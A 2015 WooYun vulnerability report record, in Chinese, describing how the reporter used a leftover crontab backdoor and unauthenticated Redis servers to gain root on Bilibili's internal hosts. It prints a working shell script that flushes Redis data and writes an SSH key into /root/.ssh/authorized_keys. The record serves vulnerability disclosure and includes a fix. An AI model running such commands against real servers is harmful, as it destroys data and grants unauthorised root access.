{"id": 73212, "wybug_id": "wooyun-2015-0154465", "wybug_title": "Bilibili 内网漫游：redis 获取 root 权限", "wybug_corp": "bilibili.com", "wybug_author": "Ricter", "wybug_date": "2015-11-20 10:29", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 我假装闲来无事地在 VPS 上监听了某一个端口，然后突然反弹过来一个 shell。嗯，假装是不知道哪年哪月的一个 crontab 后门再次把我带入了 Bilibili 的内网。  内网存在许多 redis 未授权访问，为什么不问问神奇海螺呢？ 详细说明：  我假装闲来无事地在 VPS 上监听了某一个端口，然后突然反弹过来一个 shell。\n\n估计是之前留的 crontab 后门，不过这不重要。  前几天爆出了 redis 未授权访问然后写 authorized_keys 来强行拿权限，总之原理是如此如此，可以看 https://www.sebug.net/vuldb/ssvid-89715 来了解具体利用。   在 B 站内网扫描了一下 6379 端口，然后写了一个 sh 脚本来自动化执行。   \nredis-cli  -h $1 flushall    cat foo.txt | redis-cli -h $1 -x set 1    redis-cli -h $1 config set dir /root/.ssh    redis-cli -h $1 config set dbfilename authorized_keys    redis-cli -h $1 save\n\n\n然后“姆Q”的一下子，成功了一个。\n\nBilibili (゜-゜)つロ 乾杯~由于 redis 是用 root 权限启动的，所以直接能在 /root/.ssh/ 下面写文件。\n\n\n\n   漏洞证明：  \n\n\n\n\n\n如图所示   修复方案：  用 nobody 权限来启动 redis。另外测试的 172.16.0.208、172.16.0.203 的 authorized_keys 已恢复，crontab 后门已清理。_(:3」∠)_我怕 erevus 打死我   版权声明：转载请注明来源 Ricter@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-20 11:40 厂商回复： 影响测试环境内网 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-20 10:36 |    \t\t染血の雪 \t\t\t( 普通白帽子  |\t\t\t        Rank:205 漏洞数:31        | 你挖 或者不挖漏洞就在哪儿不多 不少)\t\t \n  这都行    \n     2015-11-20 10:45 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  666    \n     2015-11-20 10:47 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:31        | 他们回来了................)\t\t \n  炮姐表示不服    \n     2015-11-20 10:56 |    \t\tAzazel \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        | 别威胁哥，哥不是好惹的)\t\t \n  卧槽，洞王666    \n     2015-11-20 11:03 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  金坷垃表示不服，必须要向音乐区宣战    \n     2015-11-20 11:13 |    \t\tCHai \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 萌新。)\t\t \n  炸了，炸了好多基佬厚    \n     2015-11-20 11:19 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:31        | 他们回来了................)\t\t \n  楼主投错区系列    \n     2015-11-20 11:19 |    \t\tFire ant \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:31        | 他们回来了................)\t\t \n  23333333333333333不就是硬币嘛   我给了    \n     2015-11-20 11:30 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:24        | test\" src=\"/upload/avatar/avatar_251_b.j...)\t\t \n  先膜RR后膜橙    \n     2015-11-20 11:35 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:195        | 。)\t\t \n  膜拜 硬币奉上    \n     2015-11-20 12:19 |    \t\tleakless \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 今天我没吃药感觉自己萌萌哒~~)\t\t \n  热烈祝贺rr进入b站内网    \n     2015-11-20 12:38 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:197 漏洞数:32        )\t\t \n  在顺着网线的路上    \n     2015-11-20 12:48 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1334 漏洞数:195        | 。)\t\t \n  @erevus 网线被他那猫咬断了怎么办QAQ    \n     2015-11-20 12:58 |    \t\tMsyb \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:13        | 非常荣幸加入乌云。)\t\t \n  我要这硬币有何用(╯‵□′)╯︵┻━┻    \n     2015-11-20 13:14 |    \t\tAklis \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 希望不断更)\t\t \n  前排膜R    \n     2015-11-20 13:16 |    \t\t边城小狗 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 解决大祸的手段就是惹一场更大的祸事)\t\t \n  处女币奉上    \n     2015-11-20 14:16 |    \t\t剑芯 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:11        | xsser)\t\t \n  B站看片，指日可待    \n     2015-11-20 14:17 |    \t\t剑芯 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:11        | xsser)\t\t \n  大家好，我是霍元钾，我已经报警大家好，我是粮静如，我已经报警大家好，我是容中而钾，我也报警了    \n     2015-11-20 14:17 |    \t\t剑芯 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:11        | xsser)\t\t \n  真当元首不上B站，渣渣    \n     2015-11-20 14:18 |    \t\t剑芯 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:11        | xsser)\t\t \n  我是比利 海磷吨，我已经报警    \n     2015-11-22 12:51 |    \t\t金坷垃 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:13        | 漏洞掺了金坷垃，一个能顶两个发)\t\t \n  @银冥币 从此节操是路人    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}